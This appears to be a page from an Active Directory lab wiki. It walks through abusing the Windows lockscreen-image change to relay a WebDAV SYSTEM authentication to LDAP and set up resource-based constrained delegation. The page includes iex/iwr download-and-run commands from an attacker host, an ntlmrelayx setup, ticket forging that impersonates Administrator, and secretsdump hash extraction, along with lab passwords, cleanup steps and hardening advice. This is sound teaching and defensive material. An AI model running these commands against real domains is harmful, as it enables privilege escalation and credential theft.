---
description: >-
  Abuse the lockscreen image changing functionality to achieve a webdav network
  authentication as SYSTEM from the given computer. Then relay the
  authentication to the Active Directory LDAP service in or
---

# Change-LockScreen

## Configuring

1. Login to `WEB01` as the `Administrator` user with password `Welcome01!`.
2. Open PowerShell and execute the following command to enable WebDav.

```
Install-WindowsFeature WebDAV-Redirector –Restart
```

2\. After the server restarts Open the "Windows Defender Firewall" to open up the SMB port.

![](<../../../.gitbook/assets/image (38).png>)

3\. Click on "Allow an app or feature through Windows Defender Firewall"

![](<../../../.gitbook/assets/image (2).png>)

4\. Select "File and Printer sharing" and click on "OK"

![](<../../../.gitbook/assets/image (23).png>)

## Attacking

### How it works

Abuse the lockscreen image changing functionality to achieve a webdav network authentication as SYSTEM from the given computer. Then relay the authentication to the Active Directory LDAP service in order to set up Resource-Based Constrained Delegation to that specific machine.

### Tools

* [Powermad](https://github.com/Kevin-Robertson/Powermad)
* [Invoke-DNSUpdate](https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1)
* [Change-LockScreen](https://github.com/nccgroup/Change-Lockscreen)
* [Impacket](https://github.com/SecureAuthCorp/impacket)

### Executing the attack

#### Prerequisite

* Low priv shell on a machine
* An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
* WebDAV Redirector feature must be installed on the victim machine. (W10 has it by default, but manually installed on server 2016 and later)
* A DNS record pointing to the attacker’s machine (By default authenticated users can do this)

#### Executing the attack

1. It is expected that a low privileged shell is already gained on `Web01` through the SQL server.

{% content-ref url="../sql-server-attacks/executing-commands.md" %}
[executing-commands.md](../sql-server-attacks/executing-commands.md)
{% endcontent-ref %}

2\. Get the machine account Qouta from the domain with crackmapexec:

```
crackmapexec ldap 10.0.0.5 -u richard -p Sample123 -M MAQ
```

![](<../../../.gitbook/assets/image (9) (1).png>)

The machine account qouta is 10, meaning we (all authenticated users) can create our own computerobject in the domain.

2\. Create machine account `FAKE01` with password `123456` with PowerMad:

```
iex (iwr http://192.168.248.3:8090/Powermad.ps1 -usebasicparsing)
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](<../../../.gitbook/assets/image (56) (1).png>)

3\. Create a DNS record for webdav to our attacking machine with Invoke-DNSUpdate. The DNS record is required for webdav connection to work. It won't connect through an IP only with a hostname.

```
iex (iwr http://192.168.248.3:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.168.248.3 -Realm amsterdam.bank.local
```

![](<../../../.gitbook/assets/image (19).png>)

We now have all our prerequisites. Time to escalate our privileges.

4\. Run NTLMRelay on our Kali machine and set it up so it will write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute that allows our created computerobject `FAKE01` to actonbehalf `WS01`:

```
python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
```

![](<../../../.gitbook/assets/image (34) (1).png>)

5\. Run the Change-LockScreen tool in the shell of WS01 and check the ntlmrelay output. The Change-LockScreen command will give an error but this doesn't matter:

```
iex (iwr http://192.168.248.3:8090/Change-Lockscreen.ps1 -usebasicparsing)
change-lockscreen -webdav \\webdav@80\
```

![](<../../../.gitbook/assets/image (1).png>)

When we check the ntlmrelay output we see that `FAKE01` can now impersonate users on `WEB01`.

![](<../../../.gitbook/assets/image (64).png>)

If we open the attribute editor on DC02 for WEB01 we can see the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute:

![](<../../../.gitbook/assets/image (51) (1) (1).png>)

6\. Create a ticket using `FAKE01` impersonating the domain admin `Administrator` using impackets getST.py. Fill in the password `123456`.

```
getST.py amsterdam/FAKE01@10.0.0.5 -spn cifs/web01.amsterdam.bank.local -impersonate administrator -dc-ip 10.0.0.3
```

![](<../../../.gitbook/assets/image (32).png>)

7\. Use this ticket and run `secretsdump.py` to dump the local admin hashes of `WEB01`.

```
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass web01.amsterdam.bank.local
```

![](<../../../.gitbook/assets/image (44) (1).png>)

### Cleanup

1. Login to `DC02` as `Administrator` with the password `Welcome01!`.
2. Execute the following command to remove the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute from `WEB01`.

```
Set-ADComputer -PrincipalsAllowedToDelegateToAccount $null -Identity web01
```

3\. Execute the following command to remove the `FAKE01` computer we created:

```
Get-ADComputer fake01 | Remove-ADObject
```

4\. Open "DNS Manager" and expand DC02 --> Forward Lookup Zones --> and click on `Amsterdam.bank.local.`Remove the DNS-record created for webdav:

![](<../../../.gitbook/assets/image (33) (1).png>)

4\. From our Kali machine set the SQL server settings back:

```
mssql-cli -S 10.0.0.5 -U sa -P sa
EXEC sp_configure 'xp_cmdshell',0
RECONFIGURE
EXEC sp_configure 'show advanced options',0
RECONFIGURE
```

## Defending

### Recommendations

* Change who can add computers to the domain.

{% content-ref url="../../../defence/hardening/change-who-can-join-computers-to-the-domain.md" %}
[change-who-can-join-computers-to-the-domain.md](../../../defence/hardening/change-who-can-join-computers-to-the-domain.md)
{% endcontent-ref %}

* Add privileged users to the protected users group.

{% content-ref url="../../../defence/hardening/protected-users-group.md" %}
[protected-users-group.md](../../../defence/hardening/protected-users-group.md)
{% endcontent-ref %}

* Add the flag "Account is sensitive and cannot be delegated".

{% content-ref url="../../../defence/hardening/account-is-sensitive-and-cannot-be-delegated.md" %}
[account-is-sensitive-and-cannot-be-delegated.md](../../../defence/hardening/account-is-sensitive-and-cannot-be-delegated.md)
{% endcontent-ref %}

* Remove the WebDav client from servers and workstations.

### Detection



## References

{% embed url="https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation" %}

{% embed url="https://github.com/Kevin-Robertson/Powermad" %}

{% embed url="https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1" %}

{% embed url="https://github.com/SecureAuthCorp/impacket" %}
